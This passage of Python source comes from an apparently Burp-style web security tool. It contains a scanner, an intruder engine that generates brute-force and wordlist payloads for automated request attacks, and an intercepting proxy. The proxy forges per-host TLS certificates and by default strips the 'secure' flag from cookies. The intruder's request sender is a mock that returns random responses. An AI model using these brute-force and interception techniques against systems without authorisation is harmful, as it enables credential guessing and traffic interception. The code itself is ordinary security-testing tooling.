            logger.error(f"Scan {scan_id} failed: {e}")

            with self.scan_lock:
                if scan_id in self.active_scans:
                    self.active_scans[scan_id]['status'] = 'failed'
                    self.active_scans[scan_id]['error'] = str(e)

    def _save_scan_results(self, scan_id: str, findings: List[Dict], project_id: str):
        """Save scan results to database"""
        try:
            # Use batch insert for better performance
            if not findings:
                return

            for finding in findings:
                finding['project_id'] = project_id
                if 'id' not in finding:
                    finding['id'] = str(uuid.uuid4())
                if 'timestamp' not in finding:
                    finding['timestamp'] = datetime.now(timezone.utc).isoformat()

            self.db_writer.add_findings(scan_id, findings, project_id)
            logger.info(f"Queued {len(findings)} findings for scan {scan_id} to database writer")

            # Prepare all data first
            '''data_to_insert = []
            for finding in findings:
                finding_id = finding.get('id', str(uuid.uuid4()))
                finding_project_id = finding.get('project_id', project_id or 'default')
                finding_request_id = finding.get('request_id', scan_id or None)
                data_to_insert.append((
                    finding_id,
                    finding_project_id,
                    finding_request_id,
                    finding.get('timestamp', datetime.now(timezone.utc).isoformat()),
                    finding.get('issue_type'),
                    finding.get('severity'),
                    finding.get('confidence'),
                    finding.get('url'),
                    finding.get('host', ''),
                    finding.get('path', ''),
                    finding.get('parameter'),
                    finding.get('description'),
                    finding.get('detail', ''),
                    finding.get('remediation'),
                    json.dumps(finding.get('evidence', {})),
                    finding.get('request', ''),
                    finding.get('response', ''),
                    self._calculate_cvss_score(finding.get('severity', 'Medium')),
                    finding.get('cwe_id', ''),
                    finding.get('owasp_category', ''),
                    'open'
                ))

            # Use single transaction for all inserts
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            try:
                cursor.executemany("""
                    INSERT OR REPLACE INTO scanner_findings 
                    (id, project_id, request_id, timestamp, issue_type, severity, confidence,
                     url, host, path, parameter, description, detail, remediation, evidence,
                     request, response, cvss_score, cwe_id, owasp_category, status)
                    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                """, data_to_insert)

                conn.commit()
                logger.info(f"Saved {len(findings)} findings to database")

            except Exception as e:
                conn.rollback()
                logger.error(f"Failed to save findings batch: {e}")
                # Fallback to individual inserts
                self._save_findings_individually(data_to_insert)'''

        except Exception as e:
            logger.error(f"Failed to save scan results: {e}")

    def _save_findings_individually(self, data_to_insert):
        """Save findings one by one (fallback method)"""
        for data in data_to_insert:
            try:
                db_manager.execute_with_lock("""
                    INSERT OR REPLACE INTO scanner_findings 
                    (id, project_id, request_id, timestamp, issue_type, severity, confidence,
                     url, host, path, parameter, description, detail, remediation, evidence,
                     request, response, cvss_score, cwe_id, owasp_category, status)
                    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                """, data)
            except Exception as e:
                logger.error(f"Failed to save individual finding: {e}")

    def get_scan_status(self, scan_id: str) -> Dict:
        """Get scan status"""
        with self.scan_lock:
            return self.active_scans.get(scan_id, {})

    def stop_scan(self, scan_id: str):
        """Stop a running scan"""
        with self.scan_lock:
            if scan_id in self.active_scans:
                self.active_scans[scan_id]['status'] = 'stopped'

    def get_scans(self) -> List[Dict]:
        """Get all scans"""
        with self.scan_lock:
            return list(self.active_scans.values())


scanner = VulnerabilityScanner()


# =================================================================
# INTRUDER ENGINE
# =================================================================

class IntruderEngine:
    """Advanced intruder engine for automated attacks"""

    def __init__(self):
        self.active_jobs = {}
        self.job_lock = threading.Lock()
        self.payload_generators = self._init_payload_generators()
        self.attack_patterns = self._init_attack_patterns()

    def _init_payload_generators(self) -> Dict:
        """Initialize payload generators"""
        return {
            'numbers': self._generate_numbers,
            'letters': self._generate_letters,
            'alphanumeric': self._generate_alphanumeric,
            'hex': self._generate_hex,
            'custom': self._generate_custom,
            'wordlist': self._generate_from_wordlist,
            'bruteforce': self._generate_bruteforce,
            'regex': self._generate_regex
        }

    def _init_attack_patterns(self) -> Dict:
        """Initialize attack patterns"""
        return {
            'sniper': {
                'name': 'Sniper',
                'description': 'Uses a single set of payloads',
                'positions': 1
            },
            'battering_ram': {
                'name': 'Battering Ram',
                'description': 'Uses the same payload for all positions',
                'positions': 'all'
            },
            'pitchfork': {
                'name': 'Pitchfork',
                'description': 'Uses multiple payload sets in parallel',
                'positions': 'multiple'
            },
            'cluster_bomb': {
                'name': 'Cluster Bomb',
                'description': 'Uses multiple payload sets in combination',
                'positions': 'multiple'
            }
        }


    def _create_project_if_needed(self, project_id: str, target_url: str = ""):
        """Create project if it doesn't exist"""
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("SELECT id FROM projects WHERE id = ?", (project_id,))
            if not cursor.fetchone():
                cursor.execute("""
                    INSERT INTO projects (id, name, description, created, modified, status)
                    VALUES (?,?,?,?,?,?)
                """, (
                    project_id,
                    f'Project {project_id}',
                    f'Project for scanning {target_url}' if target_url else 'Scan project',
                    datetime.now(timezone.utc).isoformat(),
                    datetime.now(timezone.utc).isoformat(),
                    'active'
                ))
                conn.commit()
                logger.info(f"Created project: {project_id}")

        except Exception as e:
            logger.error(f"Failed to create project {project_id}: {e}")


    def create_job(self, config: Dict) -> str:
        """Create a new intruder job"""
        job_id = str(uuid.uuid4())
        settings = config.get('settings', {})
        project_id = f"intruder-{config.get('project', 'default')}"
        self._create_project_if_needed(project_id,config.get('target_url'))
        job = {
            'id': job_id,
            'name': config.get('name', f'Attack {job_id[:8]}'),
            'description': config.get('description', ''),
            'status': 'created',
            'attack_type': config.get('attack_type', 'sniper'),
            'target_url': config.get('target_url'),
            'method': config.get('method', 'GET'),
            'headers': config.get('headers', []),
            'body_template': config.get('body_template', ''),
            'payload_sets': config.get('payload_sets', []),
            'payload_count': 0,
            'payload_processed': 0,
            'results': [],
            'stats': {
                'requests_sent': 0,
                'responses_received': 0,
                'errors': 0,
                'start_time': None,
                'end_time': None,
                'duration': 0
            },
            'settings': {
                'threads': settings.get('threads', 5),
                'rate_limit': settings.get('rate_limit', 0),
                'timeout': settings.get('timeout', 30),
                'follow_redirects': settings.get('follow_redirects', True),
                'process_cookies': settings.get('process_cookies', True),
                'encode_payloads': config.get('encode_payloads', True)
            },
            'grep_strings': config.get('grep_strings', []),
            'extract_grep': config.get('extract_grep', []),
            'created': datetime.now(timezone.utc).isoformat(),
            'modified': datetime.now(timezone.utc).isoformat(),
            'project_id': project_id
        }

        # Calculate payload count
        job['payload_count'] = self._calculate_payload_count(job)

        with self.job_lock:
            self.active_jobs[job_id] = job

        # Save to database
        self._save_job_to_db(job)

        return job_id

    def _calculate_payload_count(self, job: Dict) -> int:
        """Calculate total number of payload combinations"""
        attack_type = job['attack_type']
        payload_sets = job['payload_sets']

        if not payload_sets:
            return 0

        if attack_type == 'sniper':
            # Sum of all payloads across all sets
            return sum(len(ps.get('payloads', [])) for ps in payload_sets)

        elif attack_type == 'battering_ram':
            # All positions get the same payload
            return max(len(ps.get('payloads', [])) for ps in payload_sets)

        elif attack_type == 'pitchfork':
            # Parallel iteration through payload sets
            return min(len(ps.get('payloads', [])) for ps in payload_sets)

        elif attack_type == 'cluster_bomb':
            # Cartesian product of all payload sets
            count = 1
            for ps in payload_sets:
                count *= len(ps.get('payloads', []))
            return count

        return 0

    def _save_job_to_db(self, job: Dict):
        """Save job to database"""
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("""
                INSERT INTO intruder_jobs 
                (id, project_id, name, description, created, modified, status,
                 attack_type, target_url, method, headers, body_template,
                 payload_type, payload_sets, payload_count, payload_processed,
                 results, stats, settings, grep_strings, extract_grep)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (
                job['id'],
                job['project_id'],
                job['name'],
                job['description'],
                job['created'],
                job['modified'],
                job['status'],
                job['attack_type'],
                job['target_url'],
                job['method'],
                json.dumps(job['headers']),
                job['body_template'],
                job['attack_type'],  # payload_type
                json.dumps(job['payload_sets']),
                job['payload_count'],
                job['payload_processed'],
                json.dumps(job['results']),
                json.dumps(job['stats']),
                json.dumps(job['settings']),
                json.dumps(job['grep_strings']),
                json.dumps(job['extract_grep'])
            ))

            conn.commit()

        except Exception as e:
            logger.error(f"Failed to save intruder job: {e}")

    def start_job(self, job_id: str):
        """Start an intruder job"""
        with self.job_lock:
            if job_id not in self.active_jobs:
                return

            job = self.active_jobs[job_id]
            job['status'] = 'running'
            job['stats']['start_time'] = datetime.now(timezone.utc).isoformat()

            # Update database
            self._update_job_status(job_id, 'running')

        # Start attack in background thread
        thread = threading.Thread(
            target=self._execute_attack,
            args=(job_id,),
            daemon=True
        )
        thread.start()

    def _execute_attack(self, job_id: str):
        """Execute the actual attack"""
        try:
            with self.job_lock:
                if job_id not in self.active_jobs:
                    return

                job = self.active_jobs[job_id]

            # Generate payload combinations
            payload_combinations = self._generate_payload_combinations(job)

            # Execute requests
            self._execute_requests(job, payload_combinations)

            # Mark as completed
            with self.job_lock:
                if job_id in self.active_jobs:
                    job['status'] = 'completed'
                    job['stats']['end_time'] = datetime.now(timezone.utc).isoformat()
                    job['stats']['duration'] = (
                            datetime.now(timezone.utc) -
                            datetime.fromisoformat(job['stats']['start_time'])
                    ).total_seconds()

                    # Update database
                    self._update_job_status(job_id, 'completed')

        except Exception as e:
            logger.error(f"Attack {job_id} failed: {e}")

            with self.job_lock:
                if job_id in self.active_jobs:
                    job['status'] = 'failed'
                    job['error'] = str(e)

                    # Update database
                    self._update_job_status(job_id, 'failed')

    def _generate_payload_combinations(self, job: Dict) -> List[Dict]:
        """Generate payload combinations based on attack type"""
        attack_type = job['attack_type']
        payload_sets = job['payload_sets']

        if not payload_sets:
            return []

        combinations = []

        if attack_type == 'sniper':
            # Each payload set is used independently
            for i, ps in enumerate(payload_sets):
                for payload in ps.get('payloads', []):
                    combinations.append({
                        'position': i,
                        'payloads': {i: payload},
                        'payload_set': ps.get('name', f'Set {i}')
                    })

        elif attack_type == 'battering_ram':
            # All positions get the same payload
            for payload in payload_sets[0].get('payloads', []):
                payload_dict = {}
                for i in range(len(payload_sets)):
                    payload_dict[i] = payload

                combinations.append({
                    'position': 0,
                    'payloads': payload_dict,
                    'payload_set': 'All'
                })

        elif attack_type == 'pitchfork':
            # Parallel iteration
            max_len = min(len(ps.get('payloads', [])) for ps in payload_sets)

            for i in range(max_len):
                payload_dict = {}
                for j, ps in enumerate(payload_sets):
                    payload_dict[j] = ps.get('payloads', [])[i]

                combinations.append({
                    'position': i,
                    'payloads': payload_dict,
                    'payload_set': f'Position {i}'
                })

        elif attack_type == 'cluster_bomb':
            # Cartesian product
            import itertools

            payload_lists = [ps.get('payloads', []) for ps in payload_sets]

            for i, combo in enumerate(itertools.product(*payload_lists)):
                payload_dict = {}
                for j, payload in enumerate(combo):
                    payload_dict[j] = payload

                combinations.append({
                    'position': i,
                    'payloads': payload_dict,
                    'payload_set': f'Combo {i}'
                })

        return combinations

    '''def _execute_requests(self, job: Dict, combinations: List[Dict]):
        """Execute requests with payload combinations"""
        import concurrent.futures

        # Create thread pool
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=job['settings']['threads']
        ) as executor:
            # Submit tasks
            futures = []
            for combo in combinations:
                future = executor.submit(
                    self._execute_single_request,
                    job, combo
                )
                futures.append(future)

            # Wait for completion
            concurrent.futures.wait(futures)

            # Collect results
            results = []
            for future in futures:
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except Exception as e:
                    logger.error(f"Request failed: {e}")

            # Update job with results
            with self.job_lock:
                if job['id'] in self.active_jobs:
                    job['results'] = results
                    job['payload_processed'] = len(results)
                    job['stats']['responses_received'] = len(results)'''

    def _execute_requests(self, job: Dict, combinations: List[Dict]):
        import concurrent.futures

        total = len(combinations)
        processed = 0

        with concurrent.futures.ThreadPoolExecutor(
                max_workers=job['settings']['threads']
        ) as executor:

            future_map = {
                executor.submit(self._execute_single_request, job, combo): combo
                for combo in combinations
            }

            results = []

            for future in concurrent.futures.as_completed(future_map):
                try:
                    result = future.result()
                    if result:
                        results.append(result)

                    with self.job_lock:
                        processed += 1
                        job['payload_processed'] = processed
                        job['stats']['responses_received'] = processed

                    # 🔹 persist progress periodically
                    if processed % 5 == 0 or processed == total:
                        self._update_job_progress(job)

                except Exception as e:
                    with self.job_lock:
                        job['stats']['errors'] += 1
                    logger.error(f"Request failed: {e}")

            # Final state update
            with self.job_lock:
                job['results'] = results

    def _update_job_progress(self, job: Dict):
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("""
                UPDATE intruder_jobs
                SET payload_processed = ?,
                    stats = ?,
                    modified = ?
                WHERE id = ?
            """, (
                job['payload_processed'],
                json.dumps(job['stats']),
                datetime.now(timezone.utc).isoformat(),
                job['id']
            ))

            conn.commit()

        except Exception as e:
            logger.error(f"Failed to update intruder job progress: {e}")

    def _execute_single_request(self, job: Dict, combo: Dict) -> Dict:
        """Execute a single request with payload"""
        try:
            # Build request with payload
            request_data = self._build_request(job, combo)

            # Send request
            response = self._send_http_request(request_data, job['settings'])

            # Analyze response
            analysis = self._analyze_response(response, job)

            # Build result
            result = {
                'payload': combo['payloads'],
                'request': request_data,
                'response': response,
                'analysis': analysis,
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'status': 'success' if response else 'error'
            }

            # Apply rate limiting
            if job['settings']['rate_limit'] > 0:
                time.sleep(60 / job['settings']['rate_limit'])

            return result

        except Exception as e:
            logger.error(f"Request execution failed: {e}")
            return {
                'payload': combo['payloads'],
                'error': str(e),
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'status': 'error'
            }

    def _build_request(self, job: Dict, combo: Dict) -> Dict:
        """Build request with payload"""
        # Replace payload markers in URL
        url = job['target_url']

        # Replace markers in headers
        headers = []
        for key, value in job['headers']:
            for pos, payload in combo['payloads'].items():
                marker = f'§{pos}§'
                if marker in value:
                    value = value.replace(marker, payload)
            headers.append((key, value))

        # Replace markers in body
        body = job['body_template']
        for pos, payload in combo['payloads'].items():
            marker = f'§{pos}§'
            if marker in body:
                body = body.replace(marker, payload)

        return {
            'method': job['method'],
            'url': url,
            'headers': headers,
            'body': body if body else None,
            'payload': combo['payloads']
        }

    def _send_http_request(self, request_data: Dict, settings: Dict) -> Dict:
        """Send HTTP request"""
        # Simplified implementation - in production, use proper HTTP client
        time.sleep(0.1)  # Simulate network delay

        # Mock response for demonstration
        return {
            'status_code': random.choice([200, 404, 500]),
            'headers': [
                ('Content-Type', 'text/html'),
                ('Server', 'nginx/1.18.0')
            ],
            'body': b'Mock response body',
            'time': random.uniform(0.1, 2.0),
            'size': random.randint(100, 5000)
        }

    def _analyze_response(self, response: Dict, job: Dict) -> Dict:
        """Analyze response for interesting patterns"""
        analysis = {
            'grep_matches': [],
            'extracted': [],
            'status_code': response.get('status_code'),
            'response_time': response.get('time'),
            'response_size': response.get('size')
        }

        # Check grep strings
        body_text = response.get('body', b'').decode('utf-8', errors='ignore')

        for grep in job.get('grep_strings', []):
            if grep in body_text:
                analysis['grep_matches'].append(grep)

        # Extract data if patterns defined
        for pattern in job.get('extract_grep', []):
            matches = re.findall(pattern, body_text)
            if matches:
                analysis['extracted'].extend(matches)

        return analysis

    def _update_job_status(self, job_id: str, status: str):
        """Update job status in database"""
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("""
                UPDATE intruder_jobs 
                SET status = ?, modified = ?
                WHERE id = ?
            """, (
                status,
                datetime.now(timezone.utc).isoformat(),
                job_id
            ))

            conn.commit()

        except Exception as e:
            logger.error(f"Failed to update job status: {e}")

    def _generate_numbers(self, start: int, end: int, step: int = 1) -> List[str]:
        """Generate number sequence"""
        return [str(i) for i in range(start, end + 1, step)]

    def _generate_letters(self, length: int = 1) -> List[str]:
        """Generate letter combinations"""
        import itertools

        letters = string.ascii_lowercase
        return [''.join(combo) for combo in itertools.product(letters, repeat=length)]

    def _generate_alphanumeric(self, length: int = 1) -> List[str]:
        """Generate alphanumeric combinations"""
        import itertools

        chars = string.ascii_letters + string.digits
        return [''.join(combo) for combo in itertools.product(chars, repeat=length)]

    def _generate_hex(self, start: int, end: int) -> List[str]:
        """Generate hex values"""
        return [hex(i)[2:] for i in range(start, end + 1)]

    def _generate_custom(self, pattern: str, count: int) -> List[str]:
        """Generate custom patterns"""
        results = []
        for i in range(count):
            result = pattern.replace('{i}', str(i))
            result = result.replace('{hex}', hex(i)[2:])
            result = result.replace('{rand}', str(random.randint(0, 1000)))
            results.append(result)
        return results

    def _generate_from_wordlist(self, wordlist: List[str]) -> List[str]:
        """Generate from wordlist"""
        return wordlist

    def _generate_bruteforce(self, charset: str, length: int) -> List[str]:
        """Generate bruteforce combinations"""
        import itertools

        return [''.join(combo) for combo in itertools.product(charset, repeat=length)]

    def _generate_regex(self, pattern: str, count: int) -> List[str]:
        """Generate strings matching regex pattern"""
        # Simplified implementation
        results = []
        for i in range(count):
            if pattern == r'\d+':
                results.append(str(random.randint(1000, 9999)))
            elif pattern == r'[a-z]+':
                results.append(''.join(random.choice(string.ascii_lowercase) for _ in range(8)))
            else:
                results.append(f'match_{i}')
        return results

    def get_job(self, job_id: str) -> Dict:
        """Get job details"""
        with self.job_lock:
            return self.active_jobs.get(job_id, {})

    def get_jobs(self) -> List[Dict]:
        """Get all jobs"""
        with self.job_lock:
            return list(self.active_jobs.values())

    def stop_job(self, job_id: str):
        """Stop a running job"""
        with self.job_lock:
            if job_id in self.active_jobs:
                self.active_jobs[job_id]['status'] = 'stopped'
                self._update_job_status(job_id, 'stopped')

    def delete_job(self, job_id: str):
        """Delete a job"""
        with self.job_lock:
            if job_id in self.active_jobs:
                del self.active_jobs[job_id]

        # Delete from database
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()

            cursor.execute("DELETE FROM intruder_jobs WHERE id = ?", (job_id,))
            conn.commit()

        except Exception as e:
            logger.error(f"Failed to delete job: {e}")


intruder = IntruderEngine()


# =================================================================
# PROXY ENGINE
# =================================================================

class ProxyEngine:
    """Advanced proxy engine with interception and modification"""

    def __init__(self):
        self.intercept_enabled = True
        self.intercept_queue = {}
        self.queue_lock = threading.Lock()
        self.match_replace_rules = []
        self.filter_rules = []
        self.upstream_proxy = None
        self.ssl_strip = False
        self.listen_socket = None
        self.running = False
        self.client_threads = []
        self.stats = {
            'requests_processed': 0,
            'responses_processed': 0,
            'bytes_transferred': 0,
            'errors': 0,
            'start_time': None
        }

        # Load configuration
        self._load_config()

    def _load_config(self):
        """Load proxy configuration"""
        # Default match/replace rules
        self.match_replace_rules = [
            {
                'enabled': True,
                'type': 'request',
                'match': r'User-Agent: .*',
                'replace': 'User-Agent: Yettie/1.0',
                'description': 'Change User-Agent'
            },
            {
                'enabled': True,
                'type': 'response',
                'match': r'Set-Cookie: (.*);\s*secure',
                'replace': r'Set-Cookie: \1',
                'description': 'Remove secure flag from cookies'
            }
        ]

        # Default filter rules
        self.filter_rules = [
            {
                'enabled': True,
                'type': 'both',
                'pattern': r'\.(css|js|png|jpg|jpeg|gif|ico|svg)$',
                'action': 'drop',
                'description': 'Drop static files'
            }
        ]

    def start(self):
        """Start proxy server"""
        if self.running:
            return

        try:
            # Create socket
            self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listen_socket.settimeout(1)
            self.listen_socket.bind((Config.PROXY_HOST, Config.PROXY_PORT))
            self.listen_socket.listen(Config.MAX_CONNECTIONS)

            self.running = True
            self.stats['start_time'] = datetime.now(timezone.utc).isoformat()

            logger.info(f"Proxy started on {Config.PROXY_HOST}:{Config.PROXY_PORT}")

            # Start acceptor thread
            acceptor = threading.Thread(target=self._accept_clients, daemon=True)
            acceptor.start()
            self.client_threads.append(acceptor)

            # Start interceptor thread
            if self.intercept_enabled:
                interceptor = threading.Thread(target=self._process_intercept_queue, daemon=True)
                interceptor.start()
                self.client_threads.append(interceptor)

        except Exception as e:
            logger.error(f"Failed to start proxy: {e}")
            raise

    def stop(self):
        """Stop proxy server"""
        self.running = False

        if self.listen_socket:
            try:
                self.listen_socket.close()
            except:
                pass

        # Wait for threads to finish
        for thread in self.client_threads:
            try:
                thread.join(timeout=5)
            except:
                pass

        logger.info("Proxy stopped")

    def _accept_clients(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.listen_socket.accept()

                # Handle client in separate thread
                thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                thread.start()
                self.client_threads.append(thread)

                # Clean up finished threads
                self.client_threads = [t for t in self.client_threads if t.is_alive()]

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:  # Only log if we're supposed to be running
                    logger.error(f"Error accepting client: {e}")

    def _handle_client(self, client_socket: socket.socket, client_address: tuple):
        """Handle client connection"""
        try:
            # Set timeout
            client_socket.settimeout(Config.SOCKET_TIMEOUT)

            # Peek at first data to determine connection type
            first_data = client_socket.recv(Config.BUFFER_SIZE, socket.MSG_PEEK)

            if not first_data:
                client_socket.close()
                return

            if first_data.startswith(b"CONNECT"):
                # HTTPS/SSL connection
                self._handle_https(client_socket, first_data, client_address)
            else:
                # HTTP connection
                self._handle_http(client_socket, first_data, client_address)

        except Exception as e:
            logger.error(f"Error handling client {client_address}: {e}")
            try:
                client_socket.close()
            except:
                pass
            finally:
                self.stats['errors'] += 1

    def _handle_https(self, client_socket: socket.socket, connect_request: bytes, client_address: tuple):
        """Handle HTTPS CONNECT request"""
        try:
            # Parse CONNECT request
            data = b''
            while b'\r\n\r\n' not in data:
                chunk = client_socket.recv(Config.BUFFER_SIZE)
                if not chunk:
                    return
                data += chunk

            # 2️⃣ Parse host/port
            line = data.split(b'\r\n', 1)[0].decode()
            _, host_port, _ = line.split()
            host, port = host_port.split(':')
            port = int(port)

            # Send CONNECT success
            client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")

            cert_file = f"{Config.CERT_DIR}/{host}.crt"
            key_file = f"{Config.CERT_DIR}/{host}.key"
            if os.path.exists(cert_file) and os.path.exists(key_file):
                pass
            else:
                cert_pem, key_pem = ca.get_certificate(host)


            # Create SSL context
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(
                certfile=cert_file, #BytesIO(cert_pem)
                keyfile=key_file #BytesIO(key_pem)
            )

            # Wrap client socket
            ssl_client = ssl_context.wrap_socket(
                client_socket,
                server_side=True,
                do_handshake_on_connect=False,
                suppress_ragged_eofs=True
            )
            ssl_client.do_handshake()

            # Connect to upstream server
            upstream = socket.create_connection((host, port), timeout=Config.SOCKET_TIMEOUT)

            if port == 443:
                # Wrap upstream for SSL
                upstream_ssl = ssl.create_default_context().wrap_socket(
                    upstream,
                    server_hostname=host
                )
                self._proxy_ssl_traffic(ssl_client, upstream_ssl, host, port, client_address)
            else:
                # Plain HTTP over TLS (less common)
                self._proxy_ssl_traffic(ssl_client, upstream, host, port, client_address)

        except Exception as e:
            logger.error(f"HTTPS error for {client_address}: {e}")
            try:
                client_socket.close()
            except:
                pass

    def _handle_http(self, client_socket: socket.socket, first_data: bytes, client_address: tuple):
        """Handle HTTP request"""
        try:
            # Receive complete request
            request_data = self._receive_data(client_socket, first_data)

            if not request_data:
                client_socket.close()
                return

            # Parse host from request
            host = None
            port = 80

            # Try to get host from headers
            match = re.search(br"Host:\s*([^\r\n]+)", request_data)
            if match:
                host_port = match.group(1).decode('latin-1')
                if ':' in host_port:
                    host, port_str = host_port.split(':', 1)
                    try:
                        port = int(port_str)
                    except:
                        port = 80
                else:
                    host = host_port

            if not host:
                # Try to extract from request line
                lines = request_data.split(b'\r\n')
                if lines:
                    request_line = lines[0].decode('latin-1')
                    parts = request_line.split()
                    if len(parts) >= 2:
                        url = parts[1]
                        # Very basic URL parsing
                        if url.startswith('http://'):
                            url = url[7:]
                        if '/' in url:
                            host = url.split('/', 1)[0]

            if not host:
                logger.warning(f"No host found in request from {client_address}")
                client_socket.close()
                return

            # Apply match/replace rules
            modified_request = self._apply_match_replace(request_data, 'request')

            # Intercept if enabled
            if self.intercept_enabled:
                intercepted = self._intercept_request(modified_request, client_address)
                if intercepted is None:
                    client_socket.close()
                    return
                modified_request = intercepted

            # Apply filters
            if self._apply_filters(modified_request, 'request', host):
                logger.debug(f"Request filtered from {client_address}")
                client_socket.close()
                return

            # Connect to upstream
            try:
                upstream = socket.create_connection((host, port), timeout=Config.SOCKET_TIMEOUT)
            except Exception as e:
                logger.error(f"Failed to connect to {host}:{port}: {e}")
                client_socket.close()
                return

            # Send request to upstream
            upstream.sendall(modified_request)

            # Receive response
            response_data = self._receive_response(upstream)

            if response_data:
                # Apply match/replace rules to response
                modified_response = self._apply_match_replace(response_data, 'response')

                # Intercept response if enabled
                if self.intercept_enabled:
                    intercepted = self._intercept_response(modified_response, client_address)
                    if intercepted is None:
                        client_socket.close()
                        upstream.close()
                        return
                    modified_response = intercepted

                # Apply filters to response
                if not self._apply_filters(modified_response, 'response', host):
                    # Send response to client
                    client_socket.sendall(modified_response)

                    # Save to history
                    self._save_request(
                        'http', host, port,
                        modified_request, modified_response,
                        client_address
                    )

            # Close connections
            client_socket.close()
            upstream.close()

        except Exception as e:
            logger.error(f"HTTP error for {client_address}: {e}")
            try:
                client_socket.close()
            except:
                pass

    def _receive_data(self, socket_obj: socket.socket, initial_data: bytes = None) -> bytes:
        """Receive complete data from socket"""
        data = initial_data if initial_data else b''

        try:
            socket_obj.settimeout(Config.SOCKET_TIMEOUT)

            while True:
                chunk = socket_obj.recv(Config.BUFFER_SIZE)
                if not chunk:
                    break

                data += chunk

                # Check if we have complete headers
                if b'\r\n\r\n' in data:
                    headers_end = data.find(b'\r\n\r\n') + 4
                    headers = data[:headers_end]

                    # Check Content-Length
                    match = re.search(br'Content-Length:\s*(\d+)', headers, re.IGNORECASE)
                    if match:
                        content_length = int(match.group(1))
                        body_start = headers_end
                        if len(data) - body_start >= content_length:
                            break
                    else:
                        # Check for chunked encoding
                        if b'Transfer-Encoding: chunked' in headers:
                            if b'0\r\n\r\n' in data[headers_end:]:
                                break
                        else:
                            # No Content-Length or chunked - assume connection close
                            # Try to read until socket times out
                            try:
                                while True:
                                    more = socket_obj.recv(Config.BUFFER_SIZE)
                                    if not more:
                                        break
                                    data += more
                            except socket.timeout:
                                pass
                            break

        except socket.timeout:
            pass
        except Exception as e:
            logger.error(f"Error receiving data: {e}")

        return data

    def _receive_response(self, socket_obj: socket.socket) -> bytes:
        """Receive HTTP response"""
        return self._receive_data(socket_obj)

    def _proxy_ssl_traffic(self, client: ssl.SSLSocket, server: socket.socket,
                           host: str, port: int, client_address: tuple):
        """Proxy SSL traffic between client and server"""
        try:
            # Set timeouts
            client.settimeout(Config.SOCKET_TIMEOUT)
            server.settimeout(Config.SOCKET_TIMEOUT)

            # Create pipes for bidirectional communication
            client_to_server = threading.Thread(
                target=self._pipe_data,
                args=(client, server, 'client_to_server', host, port, client_address),
                daemon=True
            )

            server_to_client = threading.Thread(
                target=self._pipe_data,
                args=(server, client, 'server_to_client', host, port, client_address),
                daemon=True
            )

            client_to_server.start()
            server_to_client.start()

            # Wait for threads to complete
            client_to_server.join()
            server_to_client.join()

        except Exception as e:
            logger.error(f"SSL proxy error for {client_address}: {e}")
        finally:
            try:
                client.close()
            except:
                pass
            try:
                server.close()
            except:
                pass

    def _pipe_data(self, source: socket.socket, dest: socket.socket,
                   direction: str, host: str, port: int, client_address: tuple):
        """Pipe data between sockets"""
        try:
            buffer = b''

            while self.running:
                try:
                    data = source.recv(Config.BUFFER_SIZE)
                    if not data:
                        break

                    buffer += data

                    # Try to parse HTTP messages from buffer
                    if direction == 'client_to_server':
                        # Client -> Server (requests)
                        messages, remaining = self._extract_http_messages(buffer)
                        buffer = remaining

                        for msg in messages:
                            # Apply match/replace
                            modified_msg = self._apply_match_replace(msg, 'request')

                            # Intercept if enabled
                            if self.intercept_enabled:
                                intercepted = self._intercept_request(modified_msg, client_address)
                                if intercepted is None:
                                    return
                                modified_msg = intercepted

                            # Apply filters
                            if self._apply_filters(modified_msg, 'request', host):
                                continue

                            # Save request
                            self._save_request(
                                'https', host, port,
                                modified_msg, None,
                                client_address
                            )

                            # Send to destination
                            dest.sendall(modified_msg)

                    elif direction == 'server_to_client':
                        # Server -> Client (responses)
                        messages, remaining = self._extract_http_messages(buffer)
                        buffer = remaining

                        for msg in messages:
                            # Apply match/replace
                            modified_msg = self._apply_match_replace(msg, 'response')

                            # Intercept if enabled
                            if self.intercept_enabled:
                                intercepted = self._intercept_response(modified_msg, client_address)
                                if intercepted is None:
                                    return
                                modified_msg = intercepted

                            # Apply filters
                            if self._apply_filters(modified_msg, 'response', host):
                                continue

                            # Send to destination
                            dest.sendall(modified_msg)

                    else:
                        # Unknown direction, just pipe raw data
                        dest.sendall(data)

                except socket.timeout:
                    continue
                except ssl.SSLError:
                    break
                except Exception as e:
                    logger.debug(f"Pipe error ({direction}): {e}")
                    break

        except Exception as e:
            logger.error(f"Pipe thread error: {e}")

    def _extract_http_messages(self, data: bytes) -> Tuple[List[bytes], bytes]:
        """Extract complete HTTP messages from buffer"""
        messages = []
        remaining = data

        while True:
            # Find header end
            header_end = remaining.find(b'\r\n\r\n')
            if header_end == -1:
                break

            headers = remaining[:header_end + 4]

            # Check Content-Length
            match = re.search(br'Content-Length:\s*(\d+)', headers, re.IGNORECASE)
            if match:
                content_length = int(match.group(1))
                total_length = header_end + 4 + content_length

                if len(remaining) >= total_length:
                    messages.append(remaining[:total_length])
                    remaining = remaining[total_length:]
                    continue

            # Check for chunked encoding
            if b'Transfer-Encoding: chunked' in headers:
                # Look for end of chunked message
                end_pos = remaining.find(b'0\r\n\r\n')
                if end_pos != -1:
                    total_length = end_pos + 5  # Include \r\n after 0
